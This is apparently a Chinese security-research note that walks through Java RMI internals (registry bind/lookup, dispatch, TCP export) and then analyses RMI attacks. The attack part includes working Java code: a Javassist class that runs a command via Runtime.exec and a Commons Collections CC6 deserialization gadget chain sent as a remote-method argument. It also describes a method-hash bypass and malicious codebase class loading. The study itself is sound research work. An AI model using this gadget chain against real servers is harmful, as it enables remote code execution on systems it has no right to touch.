那么**RegistryImpl_Stub **中的 bind 方法具体内容如何？我们上面初探了一下，大致是通过序列化写入相对应的对象序列化数据，之后就是调用 invoke 方法
这里具体的调用 UnicastRef 的 invoke 方法还有细节可以深挖
我们跟进到 UnicastRef 的 invoke 方法的重要部分
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707296396575-a31c3ab9-a42f-4732-9dc4-edcdc016d402.png#averageHue=%236e7770&clientId=udb035c78-e8cc-4&from=paste&height=277&id=ue08aa5d5&originHeight=415&originWidth=1328&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=149670&status=done&style=none&taskId=u06ea05f6-52f9-437f-9e78-07442ef76fb&title=&width=885.3333333333334)
它这里操作是将原始类替换为了动态代理类
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707298138159-bb7c9ec6-e0e3-4884-befd-7b07ed0122a3.png#averageHue=%23393c3c&clientId=udb035c78-e8cc-4&from=paste&height=548&id=u7b2bf0c7&originHeight=822&originWidth=1639&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=365757&status=done&style=none&taskId=uef6bb250-7ad7-4d6f-8fb8-e05027b4260&title=&width=1092.6666666666667)
上述的过程是服务端用 Naming 去实现 bind 功能前后的内容，一句话总结就是获取到注册中心（这里以服务端和注册中心不在同一端为例），然后调用其注册中心功能实现类的 bind 方法向注册中心写入序列化数据，然后生成动态代理类。

1. server 端调用`LocateRegistry.getRegistry()`开始获取注册中心
2. 在本地创建一个 包含了具体通信地址、端口的 `RegistryImpl_Stub` 对象
3.  通过调用这个本地的 RegistryImpl_Stub 对象的 bind/list... 等方法，来与 Registry 端进行通信  
4.  RegistryImpl_Stub 的每个方法，都实际上调用了 RemoteRef 的 invoke 方法，进行了一次远程调用链接，向注册中心写入序列化数据  

值得注意的是，在调用 invoke 的时候一般都是通过序列化和反序列化来实现数据传输的
下面就是看注册中心对这些序列化数据如何处理了，所以接下来我们跟进到注册中心的逻辑，具体入口点下图：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707648773347-209290da-59cc-4f80-9d87-8574c03e9852.png#averageHue=%23313333&clientId=u4a80c5b7-917a-4&from=paste&height=623&id=u6e3da441&originHeight=934&originWidth=1278&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=350264&status=done&style=none&taskId=uaa5fb0f9-3114-42ed-8307-8979bd6b2c4&title=&width=852)
注册中心通过 `sun.rmi.transport.tcp.TCPTransport#handleMessages`来处理请求，并且调用`serviceCal`方法来处理
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707648893945-ea9a5c8c-2919-42ad-9528-bedfafd74489.png#averageHue=%23323334&clientId=u4a80c5b7-917a-4&from=paste&height=625&id=u7a476b43&originHeight=937&originWidth=1313&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=385289&status=done&style=none&taskId=u95b309d8-0c15-4548-8f10-5d35cb49868&title=&width=875.3333333333334)
`serviceCall`首先是获取到 HashTable 里面的 Target 和 UnicastServerRef，然后再调用 UnicastServerRef  的 dispatch 方法，这里跟进 dispatch 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707649010403-ae844f58-86be-4a5a-b877-e9581073a36b.png#averageHue=%23323333&clientId=u4a80c5b7-917a-4&from=paste&height=455&id=u71a7005d&originHeight=683&originWidth=1591&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=260330&status=done&style=none&taskId=u4e4543e7-7ea3-47da-88a7-ca8d5ee78fb&title=&width=1060.6666666666667)
dispatch 方法我们之前只在 Skel（服务器骨架）中见过，其实根据它的翻译就能够大致了解它的用法：判断我们是要调用服务中心的哪个方法，然后分别给出具体的逻辑执行
回到 UnicastServerRef 本身的 dispatch 内容，它的主要逻辑是获取输入流，然后判断 skel 全局变量是否存在，我们回顾之前在远程对象和注册中心的创建时，如果是注册中心的代理类 create，它在创建完代理类之后会有一个如下的判断
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707649402900-e136a130-02c6-46e3-93ef-ba3bceb78fe0.png#averageHue=%23323333&clientId=u4a80c5b7-917a-4&from=paste&height=86&id=u547a2f10&originHeight=129&originWidth=517&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=19477&status=done&style=none&taskId=u2e627729-073a-4ad3-82ec-414d5a616dd&title=&width=344.6666666666667)
意思就是如果我们当前是注册中心在创建动态代理类的话，就会给当前的 skel 变量赋值
所以上面的判断是在判断当前进程是服务端还是注册中心，那我们当前流程是注册中心在走，所以调用 OldDispatch 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707649600264-40a5bd90-d564-4fdc-a239-fd8e8eec762b.png#averageHue=%23323333&clientId=u4a80c5b7-917a-4&from=paste&height=603&id=u6a71c557&originHeight=904&originWidth=1769&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=442584&status=done&style=none&taskId=u69b28eba-992d-44eb-ab14-2c5e19d4464&title=&width=1179.3333333333333)
oldDispatch 方法的内容前半段差不多，进行一些数据流获取和日志写入，这里还涉及到 DGCImpl 的内容，但是我们现在不跟进，之后再走。
最终调用 skel.dispatch 方法，也就是 RegistryImpl_Skel 的 dispatch 方法
在RegistryImpl_Skel 的 dispatch 中会根据数据流中写入的操作类型不同调用不同的逻辑，例如 0 就是代表 bind ，它的内容是从流中获取到对应数据，然后进行反序列化，然后调用 RegistryImpl（相对于RegistryImpl_Stub，是本地注册中心功能的实现类） 的 bind 方法
![1633248958877.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707649751298-109a844d-8988-4d1a-9ec4-b4be294653ee.png#averageHue=%232f2b2b&clientId=u4a80c5b7-917a-4&from=paste&height=884&id=u3ca340d3&originHeight=1326&originWidth=1474&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=315138&status=done&style=none&taskId=ub47b466d-cb4b-463b-9979-5fcadfef922&title=&width=982.6666666666666)
上面就是 调用 bind 方法时，注册中心和服务端各自干的事情了，其他的关于服务端和注册中心之间的方法-rebind 等，都可以参照这个流程

#### 0x02 服务寻找-lookup
lookup 就是指客户端对注册中心的调用，寻找指定的远程对象了，这里其实跟 bind 方法的流程有很多相似的地方，客户端和服务端差不多，同样都是先获取到注册中心，当然这里也同样调用 `LocateRegistry._getRegistry_`来获取，之后就是调用注册中心 `RegistryImpl_Stub` 的 lookup 方法了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707706566849-da873118-b7a5-41b7-bab0-70aba6e5ad9d.png#averageHue=%234e5e4e&clientId=u6caac709-adb9-4&from=paste&height=443&id=u99083f8c&originHeight=665&originWidth=1559&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=288422&status=done&style=none&taskId=u74aa2546-5d3e-46dd-a71a-7ab52b490d1&title=&width=1039.3333333333333)
首先是将 name 名序列化，然后将序列化数据传入数据流，之后调用 UnicastRef 的 invoke 方法与注册中心端实现网络通信，流程与之前无异
看 registry 端处理的逻辑，在 registryImpl_Skel 的 dispatch 中，lookup 的情况是 case 2
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707707584988-5c12f58b-ed24-4eca-aa7c-05a70eec2fd9.png#averageHue=%23323334&clientId=u6caac709-adb9-4&from=paste&height=519&id=u9a03c68c&originHeight=701&originWidth=1681&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=321727&status=done&style=none&taskId=ue7d0a3c5-0542-43c4-b2e0-1535526234b&title=&width=1245.1852731482381)
case2 这里的逻辑是将我们刚才的 name 名序列化数据反序列化，然后调用本地 registryImpl 的 lookup，接受返回结果之后再序列化将其写入数据流，然后返回给客户端
#### 0x03 远程方法调用
client 客户端拿到 Registry 端返回的动态代理对象并且反序列化之后，下一步是调用这个远程对象的具体方法，看上去是本地调用，但接受到的远程代理对象是委托 RemoteRef 的 invoke 方法进行网络通信的，所以现在的 client 端是在直接和 server 端进行交互的，我们待会调用的时候也是直接服务端调用
服务端通过 UnicastServerRef 的 dispatch 来处理客户端的请求信息
主要逻辑如下：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707713536028-2b857463-77d2-428d-b63f-2740ee526023.png#averageHue=%235e715d&clientId=u6caac709-adb9-4&from=paste&height=339&id=u6974dc5e&originHeight=458&originWidth=1440&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=176511&status=done&style=none&taskId=ubabc575e-1c9f-476d-86f0-a45f7adac63&title=&width=1066.6667420187168)
首先获取数据流，然后在 hashToMethod_Map 中查找要执行方法的 hash 值对应的方法
如果找到了就会过 if 判断，打日志，之后反序列化参数，反射调用，invoke 与客户端通信将结果返回去
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707713769930-aaf08246-4bca-4cf4-9a69-257f1c7358a3.png#averageHue=%23323434&clientId=u6caac709-adb9-4&from=paste&height=497&id=u4d1c815b&originHeight=671&originWidth=1473&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=293068&status=done&style=none&taskId=u048fd87c-b2cb-492f-abed-ab12c141339&title=&width=1091.111188189979)
其实远程对象定位，然后调用远程对象方法流程只有后续的方法调用的逻辑不同，前面的寻找注册中心，以及中间的网络通信的逻辑都是大差不差的，所以我们分析 RMI 的流程可以分为 3 个大的部分：1.远程对象的创建 2.服务端对注册中心 3. 客户端对注册中心

### 原理流程总结
上面其实有很多问题可能当时没有解决，或者压根就没提，这里我码一下：
**1.为什么会在远程对象创建的时候出现了 Stub 的初始化？**
答：这里要讲明一点，Stub 是在 Server 端创建好之后，传输给 Registry，Client 再获取到的，具体逻辑见客户端`getRegistry`获取注册中心


这里我想存一下 SU18 师傅的图片总结，总结的很精辟到位
![1633322482542.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707740600543-c50d2cc5-cb74-4562-8865-aadf7931ca5f.png#averageHue=%23a8a6a6&clientId=u6caac709-adb9-4&from=paste&height=399&id=u2b228762&originHeight=605&originWidth=1289&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=256954&status=done&style=none&taskId=u8220afca-1885-42d8-a0f5-319a256d745&title=&width=850.9954223632812)
我个人将上图划分：

1. 远程对象的创建 
2. 注册中心的创建
3. 获取到注册中心
4. 从注册中心绑定、获取远程对象
5. 远程调用

### 网络通信流程
这一部分的内容也是我上面一直没有提到的过程，现在补一下
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707795366464-8c0e32b1-94a9-4e49-8cd6-566ab9519f4e.png#averageHue=%232e333c&clientId=u1ce45bef-ea98-4&from=paste&height=594&id=ud3ab8fe3&originHeight=891&originWidth=1384&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=365949&status=done&style=none&taskId=u23351439-9b69-4dfb-bd49-680a1097ae7&title=&width=922.6666666666666)
入口点是 UnicastServerRef 的 ref.exprotObject 方法，也就是说我们不论是创建远程对象还是注册中心，都会经过这个步骤
这里我们以创建注册中心为例：`LocateRegistry.createRegistry(1099);` 直接跟进到第一层
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707795485531-678ca589-2a77-44e2-811b-0479f2c252cf.png#averageHue=%23505467&clientId=u1ce45bef-ea98-4&from=paste&height=104&id=u55bcc63a&originHeight=156&originWidth=1408&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=71500&status=done&style=none&taskId=ue59661bc-ac6d-40b1-b184-c56578d447a&title=&width=938.6666666666666)
这里的 ep 是 TCPEndpoint 类，也就是说我们之后跟进的是 TCPEndpoint 的 exportObject 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707795537520-cd5c7eb2-8af9-45c7-97f3-108b797a1542.png#averageHue=%23282d33&clientId=u1ce45bef-ea98-4&from=paste&height=187&id=ub1d7d66a&originHeight=280&originWidth=927&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=130283&status=done&style=none&taskId=u488a7acc-9e2a-4a76-bac5-9a2e4970f75&title=&width=618)
TCPEndpoint 的下一层是 TCPTransport 的 exportObject 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707795585628-154eba10-a987-4603-8ac7-976bcf3c640b.png#averageHue=%234c5062&clientId=u1ce45bef-ea98-4&from=paste&height=115&id=u4efc0fd3&originHeight=173&originWidth=1426&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79007&status=done&style=none&taskId=ufffff824-dc25-40ae-832d-1b2f3ff87ed&title=&width=950.6666666666666)
继续跟进
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707795639587-5fd8a7c8-f13b-4453-a25f-877fdaadd562.png#averageHue=%233c404d&clientId=u1ce45bef-ea98-4&from=paste&height=281&id=ubac2dd62&originHeight=421&originWidth=1436&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=166270&status=done&style=none&taskId=u05e9a651-46a9-4820-98f1-c8e022d428f&title=&width=957.3333333333334)
到这才算是真正实现网络通信的地方，也就是 listen 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707795901127-0d6a729c-739f-48fd-a557-9c231d18c798.png#averageHue=%23343943&clientId=u1ce45bef-ea98-4&from=paste&height=510&id=u7bf51c16&originHeight=765&originWidth=1809&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=379113&status=done&style=none&taskId=ua219451d-8f8e-4826-819d-f89f678f863&title=&width=1206)
listen 中的逻辑是先获取到 Endpoint，也就是我们**需要发布出去的 Object 源地址**，包括 host 以及端口信息，然后的 try-catch 块中是先新建一个 Socket 等待后续的连接，然后新建一个线程，如果接收到了连接的请求，就执行线程中的内容，我们继续跟进 New ThreadAction()中的 new AcceptLoop 的内容
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707795956865-14371d4f-ec3c-49d4-9599-5f4ca503c3c5.png#averageHue=%232f333c&clientId=u1ce45bef-ea98-4&from=paste&height=471&id=udaff31d3&originHeight=707&originWidth=997&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=199619&status=done&style=none&taskId=u0cf02ac7-e940-4800-8c9e-f6d64e765ca&title=&width=664.6666666666666)
run 里面继续跟进 `executeAcceptLoop()`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707796133032-f0657842-9db5-435c-a3e0-a95f3a42a4eb.png#averageHue=%232f343c&clientId=u1ce45bef-ea98-4&from=paste&height=501&id=ub3785b57&originHeight=752&originWidth=1025&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=225310&status=done&style=none&taskId=u201b6491-9473-46c9-8149-769f869aec2&title=&width=683.3333333333334)
这里的内容就比较多了，他关键的一个步骤是会随机给我们发布出去的源地址分配一个端口号，这也是实现远程对象和注册中心（制定了端口就不会）的基本表现形式，也就是随机分配到一个端口上，能够访问到
这里全部执行完毕之后，我们的会多一个变量 port，如果这里是远程对象的发布，他会随机，但是我们这里跟进指定端口的注册中心的发布，所以是固定的 1099
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707796323246-7589242b-d30b-43da-b62a-99188ff70d8c.png#averageHue=%23292e35&clientId=u1ce45bef-ea98-4&from=paste&height=186&id=ufaed6131&originHeight=279&originWidth=707&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=90605&status=done&style=none&taskId=u6e4d8df3-8b8c-4e99-874f-025d81ff823&title=&width=471.3333333333333)
发布成功之后就是将我们当前封装的 Target 存入一个 HashTable 中，因为之后的服务实现都必须要有网络代理类和相应的功能类，Target 中就封装了这些东西，到时候实现功能的时候的就是根据其键值来取
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707796388851-bf05aed8-571d-4d7d-904c-c8d281a07f0d.png#averageHue=%234b5062&clientId=u1ce45bef-ea98-4&from=paste&height=123&id=udc2ab5b5&originHeight=184&originWidth=1417&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=76469&status=done&style=none&taskId=u0cb4e159-6836-4b37-a314-7f0bdc0482b&title=&width=944.6666666666666)

然后后面的流程就是服务端处理经由注册中心之手接收到的客户端发送过来的请求信息了，过程就不重复了
还有一个客户端通过 localRegistry 的 getRegistry 方法创建 Stub 的流程，这里简略记录一下：新开一个线程，开放一个网络端口的监听，接受到请求之后，会自动往下走线程的 Run 方法，里面调用了 Skel 的 dispatch，然后才能走服务端的处理逻辑，只不过这个 dispatch 进不去，只能静态调用

## 3.RMI 攻击流程分析
请注意，自 jdk8u121 之后单独关于 RMI 的漏洞攻击都基本修复完毕了，一般是与后面复习的漏洞进行组合拳攻击  
其次，RMI 三端其实都存在相互攻击的可能，并且我个人感觉可以衍生出更多的方面，比如反制之类，这里仅讨论 RMI Client 对 Server 端，Client 对 Registry 端，Client 本身进行记录和 note

上面铺垫了一些基础知识，主要是 RMI 三个部分：客户端 注册中心 服务端的通信，以及各自的功能实现。 简单一点，其实就只有 Registry 端，以及使用 Registry 端的地方，因为 Registry 端本身的功能只负责传递和引用，相当于数据的中转站，它自己并没有任何的实际调用，所以我们才对注册服务的一端叫做服务端，使用服务的叫做客户端
还有一点，我们上面流程中，我们调用功能（bind，lookup 等）时，一个环节的结束，总是伴随着 writeObject，将结果的序列化数据写入数据流，整个过程的数据传输都是通过序列化数据实现的，那也就是说，我们三端都是存在攻击可能的
首先先看 Server 端
### 0x01 攻击对象为 Server
#### 1x01 恶意参数攻击
该项攻击的前提是目标服务器上存在 CC 依赖或者 CB 依赖才能够进一步攻击扩展
如果是 Client 端对 Server 端进行攻击，单指**远程方法调用**这一块，可以回顾 2-0x03 段的内容，这里的重点是客户端传入的远程调用方法的参数进行反序列化，最终利用点在 UnicastServerRef 的 dispatch 方法的下面部分的代码， unmarshalValue 会对参数进行反序列化
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707810669281-949824cb-10d7-4ca0-9e48-5cfece9b24c4.png#averageHue=%232f343d&clientId=u1ce45bef-ea98-4&from=paste&height=163&id=u9ebaf904&originHeight=244&originWidth=1153&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79393&status=done&style=none&taskId=u06437340-c80c-480f-bfa8-a2abdda9bbe&title=&width=768.6666666666666)
所以这里我们可以传入恶意序列化数据，比如说 CC6 或者 CC11 等都是可以的
这里结合一下 Javassist 复习，写一个更加 恶意类更短的 CC6
先写恶意类的字节码
```java
import javassist.*;

public class EvilClassWrite {
    public static byte[] GetShortTemplatesImpl(String cmd) {

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("        try {\n" +
                    "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                    "        } catch (Exception ignored) {\n" +
                    "        }");
            CtMethod ctMethod1 = CtMethod.make("    public void transform(" +
                    "com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                    "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) {\n" +
                    "    }", ctClass);
            ctClass.addMethod(ctMethod1);
            CtMethod ctMethod2 = CtMethod.make("    public void transform(" +
                    "com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                    "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, " +
                    "com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {\n" +
                    "    }", ctClass);
            ctClass.addMethod(ctMethod2);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }

    }
}
```
然后用最基本的 TemplateImpl 的 CC6，不过这里返回的是 HashMap 的对象，因为利用点--- RMI 远程方法调用的参数首先会被 Stub 序列化，再传入 Server 端进行反序列化，省去了我们自己序列化的过程
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

public class EvilClass {
    public static Object getEvil() throws Exception {
        TemplatesImpl templates=new TemplatesImpl();
        Class tc=templates.getClass();
        Field nameFiled=tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates,"aaa");

        Field bytecodesField=tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code= new EvilClassWrite().GetShortTemplatesImpl("calc");
        byte[][] codes={code};
        bytecodesField.set(templates,codes);


        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",null,null);
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1));

        TiedMapEntry tiedMapeEntry=new TiedMapEntry(lazymap,templates);

        HashMap<Object,Object> map2= new HashMap<>();
        map2.put(tiedMapeEntry,"bbb");
        lazymap.remove(templates);

        Class c=LazyMap.class;
        Field factoryField=c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazymap,invokerTransformer);
        return map2;
    }

}
```
然后开启 Server ，用 Cilent 去打
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707896858463-bb7ebcfc-45aa-4c30-a07c-bbb0a12f66e4.png#averageHue=%23454a53&clientId=ud92b7488-b28d-4&from=paste&height=643&id=u12a196ae&originHeight=965&originWidth=2540&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=594545&status=done&style=none&taskId=u78a2f7a0-e1b2-41bb-8fcd-59722be0715&title=&width=1693.3333333333333)
这种情况是只存在于我们攻击的参数类型为 Object 时才会成功，那假如说服务端设定的参数不是 Object，而是我们不知道的一个的参数类型呢？
假如说我们现在服务端所定义的远程对象所接受的参数类型为 HelloObject
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707981941081-cdaa3d71-7a73-4eaf-bcd5-9a8efed083a3.png#averageHue=%232f343c&clientId=u60658441-db48-4&from=paste&height=300&id=u3162ca6b&originHeight=450&originWidth=1254&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=179128&status=done&style=none&taskId=ub25e5a7e-72f7-48b7-90f2-7a3f673369a&title=&width=836)
然后我们客户端再打
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707982028814-6dd396e9-0cc7-4c01-a5a1-26aa770da01e.png#averageHue=%23323a48&clientId=u60658441-db48-4&from=paste&height=139&id=ub6d683e6&originHeight=208&originWidth=1993&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=122162&status=done&style=none&taskId=u12377537-d192-4296-bcf3-4969280d4d5&title=&width=1328.6666666666667)
很明显是不行的，具体报错如下
![1633416958518.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707982061949-0ee02257-ec17-4b48-bde7-b3d776069ddd.png#averageHue=%233c3131&clientId=u60658441-db48-4&from=paste&height=272&id=u24e693e9&originHeight=408&originWidth=1926&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=185039&status=done&style=none&taskId=u113ebf0c-a1b4-4dbd-b400-c15e9d05183&title=&width=1284)
精确一点，这个报错是在说服务端无法找到对应的方法，因为我们所有的方法都是从 UnicastServerRef  的`this.hashToMethod_Map`通过哈希键值对应得，而我们现在传过去的参数类型是 Object，与 HelloObject 的哈希值肯定不相等，所以不能成功调用，进入反序列化的过程
那么肯定是在服务端调用之前就被拦截了，具体 Hook 的点呢，是在`RemoteObjectInvocationHandler`，整个客户端调到服务端的远程对象都是通过 Stub 远程代理类来做的，我们当时创建 Proxy 代理类的时候也是创建的，所以当我们的客户端与服务端通信的时候，都会经过相对应的代理方法走一遍
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707982283899-75657e86-13bd-4be0-b862-96717f7b4dad.png#averageHue=%232e333c&clientId=u60658441-db48-4&from=paste&height=331&id=uf29b0d47&originHeight=496&originWidth=1246&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=187481&status=done&style=none&taskId=uffedd345-11d7-4d7b-9de5-7fff128dfc1&title=&width=830.6666666666666)
真正对 hash 值做处理的是在`RemoteObjectInvocationHandler`的`invokeRemoteMethod`中，getMethodHash 方法对我们的 method 进行了 hash 算取，这里就有很多可以操作的点了

- 通过网络代理，在流量层修改数据
- 自定义 “java.rmi” 包的代码，自行实现
- 字节码修改
- 使用 debugger

这里最简单的是直接 debugger 就行，调试的时候将类型改为 HelloObject，算取的 hash 就能够对应上了，其他方法还未复现，这里就不码了
[https://www.anquanke.com/post/id/200860](https://www.anquanke.com/post/id/200860)
[https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg](https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg)
感兴趣的师傅可以看看上面这两篇文章，高版本之后的很多防御点都是通过修改RemoteObjectInvocationHandler 实现的
#### 1x02 动态类加载
之前讨论过，RMI 还存一种从指定 codebase 中加载任意类的功能，具体一点就是当 Client 端传入在 Server 端 ClassPath 找不到的类时，RMI 就会从另外一个指定的地方寻找，并加载
但是也有条件，并不是说默认开启的。1.Server 端必须加载和配置好 SecurityManager，2.`java.rmi.server.useCodebaseOnly=false`必须开启 3.版本必须是 6u45/7u21  之前
具体的代码，我们还是从服务端的 UnicastServerRef 的 dispatch 看
依然还是反序列化参数的过程，我们进到默认的参数反序列化方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708052378086-7a81a9ac-4d5c-4e52-8082-9d6fe43cde12.png#averageHue=%232f343d&clientId=uba8eeb93-14fe-4&from=paste&height=267&id=u9c1b9845&originHeight=400&originWidth=1775&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=192434&status=done&style=none&taskId=ube2f610d-4fce-4b78-a06d-aed57c5a4be&title=&width=1183.3333333333333)
这里的参数 var1 是我们指定的方法名，var2 则是 MarshalInputStream
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708052446657-52c0a036-9769-4397-ae91-3ad3b2b734a2.png#averageHue=%232f353f&clientId=uba8eeb93-14fe-4&from=paste&height=107&id=u68339e44&originHeight=161&originWidth=2282&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=115924&status=done&style=none&taskId=u90b9aaec-0370-4693-9d44-2bf66324e24&title=&width=1521.3333333333333)
当我们继续跟进 unmarshalValue 的时候，他调用的是 `MarshalInputStream`

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708052479450-0e5152c3-f3ba-4350-a1aa-fdd3e4ae324c.png#averageHue=%232e333c&clientId=uba8eeb93-14fe-4&from=paste&height=653&id=ub43a6033&originHeight=979&originWidth=1703&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=430359&status=done&style=none&taskId=ubac832ee-5d7b-4100-b3ff-7c4cff78bcb&title=&width=1135.3333333333333)

待会反序列化的时候会调用 resolveClass 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708052607407-9ba15498-059f-4e9a-a5e9-9b26c1516366.png#averageHue=%232e333c&clientId=uba8eeb93-14fe-4&from=paste&height=635&id=u12593e83&originHeight=953&originWidth=1659&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=465262&status=done&style=none&taskId=ub597cac9-2876-48e7-a881-099932b7269&title=&width=1106)
这里的逻辑：首先调用 readLocation ，获取到 Codebase 的地址，然后获取到我们想要反序列化的类名，之后检测一下`useCodebaseOnly`是否开启
然后就开始调用 `RMIClassLoader`的 loadClass 方法，跟进
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708063428698-3c216483-8748-435e-99f7-df2a9f220ea4.png#averageHue=%232f343d&clientId=u1d7260be-9af7-4&from=paste&height=189&id=u241cb9af&originHeight=284&originWidth=1141&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=101796&status=done&style=none&taskId=u77bc3b6f-db0d-4978-a8d2-c6f99fc247a&title=&width=760.6666666666666)
这里的话需要一直跟进到`sun.rmi.server.LoaderHandler`的 loadClassForName
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708063550607-e3eaf34b-726e-4536-8f17-79ec83d3226f.png#averageHue=%232e343d&clientId=u1d7260be-9af7-4&from=paste&height=207&id=ub07ebeaa&originHeight=311&originWidth=1690&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=142963&status=done&style=none&taskId=uec1197d2-c956-492f-ac30-1b46dec9e2f&title=&width=1126.6666666666667)
通过 Class.forName 来实现类加载，这里传入了自定的类加载器`LoaderHandler$Loader`
而这里的 Loader 也是 URLClassLoader 的子类
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708063662679-ed429453-40bf-4923-9d44-d4ad1a5f8f5a.png#averageHue=%232e333c&clientId=u1d7260be-9af7-4&from=paste&height=230&id=u91c319ce&originHeight=345&originWidth=1074&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=94561&status=done&style=none&taskId=ua62ffb96-67a8-4c8a-a72a-7824ba68b03&title=&width=716)
不论是 Client 端还是 Server 端，两端只要有一段配置了 `java.rmi.server.codebase` 那么 Client 就能够通过这个参数传递 Server 端不存在的类，pushServer 端去恶意 codebase 加载恶意类了

### 0x02 攻击对象为 Registry
#### 1x01 客户端攻击 Registry
先看客户端，很明显的就是直接 lookup，然后经由注册中心的 `RegistryImpl_Skel` 的 dispatch 方法中关于 lookup 的处理逻辑
